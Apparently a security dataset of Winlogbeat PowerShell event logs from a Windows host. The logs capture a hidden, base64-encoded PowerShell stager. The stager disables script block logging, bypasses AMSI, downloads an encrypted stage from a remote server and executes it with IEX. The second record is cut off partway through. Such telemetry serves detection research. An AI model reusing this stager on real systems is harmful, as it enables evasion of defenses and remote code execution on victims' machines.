{"@timestamp":"2019-05-18T20:43:14.331Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"opcode":"To be used when operation is just executing a method","event_data":{"ContextInfo":"        Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.17763.316\n        Host ID = 76b548b3-2221-41d9-8e53-ad5dff2c5c4e\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBFAHIAUwBpAE8AbgBUAEEAQgBsAEUALgBQAFMAVgBlAHIAcwBJAE8ATgAuAE0AQQBqAG8AcgAgAC0AZwBFACAAMwApAHsAJAAyADQAMQBmAD0AWwByAEUAZgBdAC4AQQBzAHMAZQBtAEIATAB5AC4ARwBlAHQAVABZAHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYASQBFAGAATABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAEYAKAAkADIANAAxAEYAKQB7ACQARgAwADkAQQA9ACQAMgA0ADEAZgAuAEcARQB0AFYAQQBMAHUAZQAoACQATgB1AEwATAApADsASQBGACgAJABmADAAOQBhAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQARgAwADkAQQBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABmADAAOQBhAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBhAEwAPQBbAEMATwBsAGwARQBjAHQASQBPAG4AUwAuAEcAZQBOAGUAUgBJAGMALgBEAEkAQwBUAEkATwBOAGEAcgB5AFsAUwBUAFIAaQBOAEcALABTAFkAcwB0AGUAbQAuAE8AQgBKAEUAYwB0AF0AXQA6ADoAbgBFAHcAKAApADsAJABWAEEAbAAuAEEAZABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AGEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAGYAMAA5AGEAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBBAEwAfQBFAEwAUwBlAHsAWwBTAEMAcgBJAHAAdABCAGwATwBDAGsAXQAuACIARwBlAHQARgBJAGUAYABMAGQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQB0AFYAQQBMAHUARQAoACQAbgBVAEwAbAAsACgATgBFAHcALQBPAEIASgBlAEMAVAAgAEMAbwBMAGwARQBjAFQAaQBPAG4AcwAuAEcAZQBuAGUAcgBpAGMALgBIAGEAcwBIAFMARQBUAFsAUwBUAHIAaQBOAGcAXQApACkAfQAkAFIAZQBGAD0AWwBSAEUAZgBdAC4AQQBzAFMAZQBNAGIATABZAC4ARwBlAFQAVABZAHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQA7ACQAUgBlAGYALgBHAGUAVABGAEkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQB0AFYAQQBsAFUARQAoACQAbgBVAGwATAAsACQAVABSAFUAZQApADsAfQA7AFsAUwBZAHMAVABlAE0ALgBOAEUAdAAuAFMARQByAFYASQBDAEUAUABvAEkATgBUAE0AYQBuAEEARwBlAHIAXQA6ADoARQB4AHAARQBjAFQAMQAwADAAQwBvAE4AVABJAE4AdQBlAD0AMAA7ACQANQAwADgAYwA9AE4AZQBXAC0ATwBCAGoAZQBDAHQAIABTAHkAcwBUAGUATQAuAE4ARQB0AC4AVwBlAEIAQwBsAGkARQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQANQAwADgAQwAuAEgAZQBBAGQARQByAFMALgBBAEQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkADUAMAA4AGMALgBIAGUAYQBEAEUAcgBzAC4AQQBkAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAA1ADAAOABjAC4AUAByAG8AeAB5AD0AWwBTAHkAcwB0AEUAbQAuAE4AZQB0AC4AVwBlAEIAUgBlAHEAVQBFAHMAVABdADoAOgBEAGUAZgBhAHUAbAB0AFcARQBCAFAAUgBvAFgAWQA7ACQANQAwADgAYwAuAFAAcgBPAHgAWQAuAEMAUgBFAEQARQBuAFQAaQBBAGwAcwAgAD0AIABbAFMAeQBzAHQAZQBNAC4ATgBFAFQALgBDAHIAZQBkAEUAbgBUAEkAQQBsAEMAQQBjAEgAZQBdADoAOgBEAEUARgBhAHUATABUAE4ARQBUAHcAbwBSAEsAQwByAEUAZABlAE4AVABJAEEAbABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADUAMAA4AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBTAHQAZQBNAC4AVABFAFgAdAAuAEUATgBDAG8ARABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAVABCAFkAVABFAFMAKAAnAH4AawAqAF8ARgBTAGoAcgA4ACUAeAB3AGUASgA2AGgAfABQAEsALgBmAHsAVQBOAE0ASAB1AGQAcAA1AHkAbQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAEcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AE4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBCAFgAbwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAHMAZQByAD0AJAAoAFsAVABlAHgAVAAuAEUATgBjAG8ARABJAG4ARwBdADoAOgBVAG4AaQBjAG8ARABFAC4ARwBFAHQAUwBUAFIASQBOAEcAKABbAEMATwBOAHYARQByAHQAXQA6ADoARgByAE8ATQBCAEEAUwBlADYANABTAFQAUgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBCAHoAQQBEAG8AQQBMAHcAQQB2AEEARABFAEEATQBBAEEAdQBBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATgBnAEEAPQAnACkAKQApADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJAA1ADAAOABjAC4ASABlAGEAZABFAHIAUwAuAEEAZABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgBIAFkAdgBsAFAASgBNAG0AcwBrAHkATgBGAFQAawA9AGkAKwBjAHMANQBCAFAARwBjAGEAUgBJAFAAWgA1AGcAMgBOAEQATQBtADUAUQBZAGoAVQBrAD0AIgApADsAJABEAGEAVABhAD0AJAA1ADAAOABjAC4ARABvAFcAbgBsAG8AQQBEAEQAQQB0AEEAKAAkAHMAZQByACsAJAB0ACkAOwAkAGkAVgA9ACQAZABhAHQAQQBbADAALgAuADMAXQA7ACQARABBAFQAQQA9ACQAZABBAHQAQQBbADQALgAuACQARABhAHQAQQAuAEwARQBOAEcAVABoAF0AOwAtAEoAbwBJAG4AWwBDAEgAYQByAFsAXQBdACgAJgAgACQAUgAgACQAZABBAHQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA\n        Engine Version = 5.1.17763.316\n        Runspace ID = 5394f09a-82e8-432b-a847-ed46ac75eed1\n        Pipeline ID = 1\n        Command Name = ForEach-Object\n        Command Type = Cmdlet\n        Script Name = \n        Command Path = \n        Sequence Number = 71039\n        User = SHIRE\\nmartha\n        Connected User = \n        Shell ID = Microsoft.PowerShell","Payload":"CommandInvocation(ForEach-Object): \"ForEach-Object\"\nParameterBinding(ForEach-Object): name=\"Process\"; value=\"$508c.Headers.Add($_.Name, $_.Value)\""},"type":"wineventlog","version":1,"level":"Information","host":{"name":"WECserver"},"source_name":"Microsoft-Windows-PowerShell","computer_name":"HR001.shire.com","thread_id":3896,"process_id":5452,"log_name":"Microsoft-Windows-PowerShell/Operational","activity_id":"{c93a7728-017f-0000-ca04-4aca7f01d501}","user":{"domain":"SHIRE","type":"User","identifier":"S-1-5-21-2511471446-1103646877-3980648787-1106","name":"nmartha"},"record_number":"92792","task":"Executing Pipeline","beat":{"version":"6.7.0","name":"WECserver","hostname":"WECserver"},"provider_guid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","event_id":4103,"message":"CommandInvocation(ForEach-Object): \"ForEach-Object\"\nParameterBinding(ForEach-Object): name=\"Process\"; value=\"$508c.Headers.Add($_.Name, $_.Value)\"\n\n\nContext:\n        Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.17763.316\n        Host ID = 76b548b3-2221-41d9-8e53-ad5dff2c5c4e\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBFAHIAUwBpAE8AbgBUAEEAQgBsAEUALgBQAFMAVgBlAHIAcwBJAE8ATgAuAE0AQQBqAG8AcgAgAC0AZwBFACAAMwApAHsAJAAyADQAMQBmAD0AWwByAEUAZgBdAC4AQQBzAHMAZQBtAEIATAB5AC4ARwBlAHQAVABZAHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYASQBFAGAATABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAEYAKAAkADIANAAxAEYAKQB7ACQARgAwADkAQQA9ACQAMgA0ADEAZgAuAEcARQB0AFYAQQBMAHUAZQAoACQATgB1AEwATAApADsASQBGACgAJABmADAAOQBhAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQARgAwADkAQQBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABmADAAOQBhAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBhAEwAPQBbAEMATwBsAGwARQBjAHQASQBPAG4AUwAuAEcAZQBOAGUAUgBJAGMALgBEAEkAQwBUAEkATwBOAGEAcgB5AFsAUwBUAFIAaQBOAEcALABTAFkAcwB0AGUAbQAuAE8AQgBKAEUAYwB0AF0AXQA6ADoAbgBFAHcAKAApADsAJABWAEEAbAAuAEEAZABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AGEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAGYAMAA5AGEAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBBAEwAfQBFAEwAUwBlAHsAWwBTAEMAcgBJAHAAdABCAGwATwBDAGsAXQAuACIARwBlAHQARgBJAGUAYABMAGQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQB0AFYAQQBMAHUARQAoACQAbgBVAEwAbAAsACgATgBFAHcALQBPAEIASgBlAEMAVAAgAEMAbwBMAGwARQBjAFQAaQBPAG4AcwAuAEcAZQBuAGUAcgBpAGMALgBIAGEAcwBIAFMARQBUAFsAUwBUAHIAaQBOAGcAXQApACkAfQAkAFIAZQBGAD0AWwBSAEUAZgBdAC4AQQBzAFMAZQBNAGIATABZAC4ARwBlAFQAVABZAHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQA7ACQAUgBlAGYALgBHAGUAVABGAEkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQB0AFYAQQBsAFUARQAoACQAbgBVAGwATAAsACQAVABSAFUAZQApADsAfQA7AFsAUwBZAHMAVABlAE0ALgBOAEUAdAAuAFMARQByAFYASQBDAEUAUABvAEkATgBUAE0AYQBuAEEARwBlAHIAXQA6ADoARQB4AHAARQBjAFQAMQAwADAAQwBvAE4AVABJAE4AdQBlAD0AMAA7ACQANQAwADgAYwA9AE4AZQBXAC0ATwBCAGoAZQBDAHQAIABTAHkAcwBUAGUATQAuAE4ARQB0AC4AVwBlAEIAQwBsAGkARQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQANQAwADgAQwAuAEgAZQBBAGQARQByAFMALgBBAEQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkADUAMAA4AGMALgBIAGUAYQBEAEUAcgBzAC4AQQBkAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAA1ADAAOABjAC4AUAByAG8AeAB5AD0AWwBTAHkAcwB0AEUAbQAuAE4AZQB0AC4AVwBlAEIAUgBlAHEAVQBFAHMAVABdADoAOgBEAGUAZgBhAHUAbAB0AFcARQBCAFAAUgBvAFgAWQA7ACQANQAwADgAYwAuAFAAcgBPAHgAWQAuAEMAUgBFAEQARQBuAFQAaQBBAGwAcwAgAD0AIABbAFMAeQBzAHQAZQBNAC4ATgBFAFQALgBDAHIAZQBkAEUAbgBUAEkAQQBsAEMAQQBjAEgAZQBdADoAOgBEAEUARgBhAHUATABUAE4ARQBUAHcAbwBSAEsAQwByAEUAZABlAE4AVABJAEEAbABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADUAMAA4AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBTAHQAZQBNAC4AVABFAFgAdAAuAEUATgBDAG8ARABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAVABCAFkAVABFAFMAKAAnAH4AawAqAF8ARgBTAGoAcgA4ACUAeAB3AGUASgA2AGgAfABQAEsALgBmAHsAVQBOAE0ASAB1AGQAcAA1AHkAbQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAEcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AE4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBCAFgAbwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAHMAZQByAD0AJAAoAFsAVABlAHgAVAAuAEUATgBjAG8ARABJAG4ARwBdADoAOgBVAG4AaQBjAG8ARABFAC4ARwBFAHQAUwBUAFIASQBOAEcAKABbAEMATwBOAHYARQByAHQAXQA6ADoARgByAE8ATQBCAEEAUwBlADYANABTAFQAUgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBCAHoAQQBEAG8AQQBMAHcAQQB2AEEARABFAEEATQBBAEEAdQBBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATgBnAEEAPQAnACkAKQApADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJAA1ADAAOABjAC4ASABlAGEAZABFAHIAUwAuAEEAZABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgBIAFkAdgBsAFAASgBNAG0AcwBrAHkATgBGAFQAawA9AGkAKwBjAHMANQBCAFAARwBjAGEAUgBJAFAAWgA1AGcAMgBOAEQATQBtADUAUQBZAGoAVQBrAD0AIgApADsAJABEAGEAVABhAD0AJAA1ADAAOABjAC4ARABvAFcAbgBsAG8AQQBEAEQAQQB0AEEAKAAkAHMAZQByACsAJAB0ACkAOwAkAGkAVgA9ACQAZABhAHQAQQBbADAALgAuADMAXQA7ACQARABBAFQAQQA9ACQAZABBAHQAQQBbADQALgAuACQARABhAHQAQQAuAEwARQBOAEcAVABoAF0AOwAtAEoAbwBJAG4AWwBDAEgAYQByAFsAXQBdACgAJgAgACQAUgAgACQAZABBAHQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA\n        Engine Version = 5.1.17763.316\n        Runspace ID = 5394f09a-82e8-432b-a847-ed46ac75eed1\n        Pipeline ID = 1\n        Command Name = ForEach-Object\n        Command Type = Cmdlet\n        Script Name = \n        Command Path = \n        Sequence Number = 71039\n        User = SHIRE\\nmartha\n        Connected User = \n        Shell ID = Microsoft.PowerShell\n\n\nUser Data:"}
{"@timestamp":"2019-05-18T20:43:14.332Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"type":"wineventlog","event_id":4103,"source_name":"Microsoft-Windows-PowerShell","host":{"name":"WECserver"},"provider_guid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","process_id":5452,"user":{"identifier":"S-1-5-21-2511471446-1103646877-3980648787-1106","name":"nmartha","domain":"SHIRE","type":"User"},"event_data":{"ContextInfo":"        Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.17763.316\n        Host ID = 76b548b3-2221-41d9-8e53-ad5dff2c5c4e\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBFAHIAUwBpAE8AbgBUAEEAQgBsAEUALgBQAFMAVgBlAHIAcwBJAE8ATgAuAE0AQQBqAG8AcgAgAC0AZwBFACAAMwApAHsAJAAyADQAMQBmAD0AWwByAEUAZgBdAC4AQQBzAHMAZQBtAEIATAB5AC4ARwBlAHQAVABZAHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYASQBFAGAATABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAEYAKAAkADIANAAxAEYAKQB7ACQARgAwADkAQQA9ACQAMgA0ADEAZgAuAEcARQB0AFYAQQBMAHUAZQAoACQATgB1AEwATAApADsASQBGACgAJABmADAAOQBhAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQARgAwADkAQQBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABmADAAOQBhAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBhAEwAPQBbAEMATwBsAGwARQBjAHQASQBPAG4AUwAuAEcAZQBOAGUAUgBJAGMALgBEAEkAQwBUAEkATwBOAGEAcgB5AFsAUwBUAFIAaQBOAEcALABTAFkAcwB0AGUAbQAuAE8AQgBKAEUAYwB0AF0AXQA6ADoAbgBFAHcAKAApADsAJABWAEEAbAAuAEEAZABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AGEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAGYAMAA5AGEAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBBAEwAfQBFAEwAUwBlAHsAWwBTAEMAcgBJAHAAdABCAGwATwBDAGsAXQAuACIARwBlAHQARgBJAGUAYABMAGQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQB0AFYAQQBMAHUARQAoACQAbgBVAEwAbAAsACgATgBFAHcALQBPAEIASgBlAEMAVAAgAEMAbwBMAGwARQBjAFQAaQBPAG4AcwAuAEcAZQBuAGUAcgBpAGMALgBIAGEAcwBIAFMARQBUAFsAUwBUAHIAaQBOAGcAXQApACkAfQAkAFIAZQBGAD0AWwBSAEUAZgBdAC4AQQBzAFMAZQBNAGIATABZAC4ARwBlAFQAVABZAHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQA7ACQAUgBlAGYALgBHAGUAVABGAEkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQB0AFYAQQBsAFUARQAoACQAbgBVAGwATAAsACQAVABSAFUAZQApADsAfQA7AFsAUwBZAHMAVABlAE0ALgBOAEUAdAAuAFMARQByAFYASQBDAEUAUABvAEkATgBUAE0AYQBuAEEARwBlAHIAXQA6ADoARQB4AHAARQBjAFQAMQAwADAAQwBvAE4AVABJAE4AdQBlAD0AMAA7ACQANQAwADgAYwA9AE4AZQBXAC0ATwBCAGoAZQBDAHQAIABTAHkAcwBUAGUATQAuAE4ARQB0AC4AVwBlAEIAQwBsAGkARQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQANQAwADgAQwAuAEgAZQBBAGQARQByAFMALgBBAEQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkADUAMAA4AGMALgBIAGUAYQBEAEUAcgBzAC4AQQBkAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAA1ADAAOABjAC4AUAByAG8AeAB5AD0AWwBTAHkAcwB0AEUAbQAuAE4AZQB0AC4AVwBlAEIAUgBlAHEAVQBFAHMAVABdADoAOgBEAGUAZgBhAHUAbAB0AFcARQBCAFAAUgBvAFgAWQA7ACQANQAwADgAYwAuAFAAcgBPAHgAWQAuAEMAUgBFAEQARQBuAFQAaQBBAGwAcwAgAD0AIABbAFMAeQBzAHQAZQBNAC4ATgBFAFQALgBDAHIAZQBkAEUAbgBUAEkAQQBsAEMAQQBjAEgAZQBdADoAOgBEAEUARgBhAHUATABU